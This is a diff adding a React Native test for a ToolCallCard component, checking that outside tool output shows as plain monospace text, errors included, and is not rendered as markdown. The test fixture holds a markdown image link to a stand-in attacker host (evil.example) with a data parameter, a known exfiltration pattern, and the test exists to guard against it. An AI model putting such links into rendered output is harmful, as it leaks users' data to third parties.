@@ -119,3 +119,26 @@ describe('ToolCallCard', () => {
     expect(queryByText('1850')).toBeNull();
   });
 });
+
+it.each([false, true])(
+  'shows outside output as plain monospace text, including errors (%s)',
+  (isError) => {
+    const output = '**untrusted** ![](https://evil.example/?d=x)';
+    const { getByText, getByTestId, queryByTestId } = render(
+      <ToolCallCard
+        part={{
+          ...baseFoodPart,
+          toolName: 'mcp_notes',
+          result: output,
+          isError,
+        }}
+      />
+    );
+    fireEvent.press(getByText('Mcp notes'));
+    expect(getByTestId('outside-tool-output').props.children).toBe(output);
+    expect(
+      getByTestId('outside-tool-output').props.style.fontFamily
+    ).toBeTruthy();
+    expect(queryByTestId('enriched-markdown')).toBeNull();
+  }
+);
